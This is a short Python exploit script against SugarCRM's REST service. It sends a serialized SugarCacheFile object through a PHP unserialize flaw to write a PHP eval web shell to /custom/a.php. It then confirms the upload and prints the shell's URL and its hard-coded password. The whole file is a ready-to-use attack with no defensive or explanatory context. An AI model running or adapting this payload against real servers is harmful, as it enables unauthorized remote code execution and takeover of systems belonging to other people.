#!/usr/bin/dev python
# -*- coding:utf-8 -*-
# author: Lion Ei'Jonson
# date:2017/9/22

import requests
import sys

def usage():
	print("[*]Useage: python %s http://www.lioneijonson.cn" % sys.argv[0])

def check_file():
	url = sys.argv[1] + "/custom/a.php"
	response = requests.get(url)
	if response.status_code == 200:
		return True
	else:
		print("[!]Can't unserialize to upload file.")
		sys.exit();

if __name__ == '__main__':
	if len(sys.argv) != 2:
		usage()
		sys.exit()
	if(sys.argv[1][:4]) != "http":
		url = "http://" + sys.argv[1]
	else:
		url =sys.argv[1]
	target = url + "/service/v4/rest.php"
	data = {
		'method':'login',
		'input_type':'Serialize',
		'rest_data':'O:+14:"SugarCacheFile":23:{S:17:"\\00*\\00_cacheFileName";s:15:"../custom/a.php";S:16:"\\00*\\00_cacheChanged";b:1;S:14:"\\00*\\00_localStore";a:1:{i:0;s:29:"&lt;?php eval($_POST[\'Li0nE1Jon5on\']); ?&gt;";}}',
	}
	requests.post(target,data=data)
	if check_file():
		print("[*]The File upload success")
		print("[*]shell url:%s/custom/a.php" % url)
		print("[*]password:Li0nE1Jon5on")

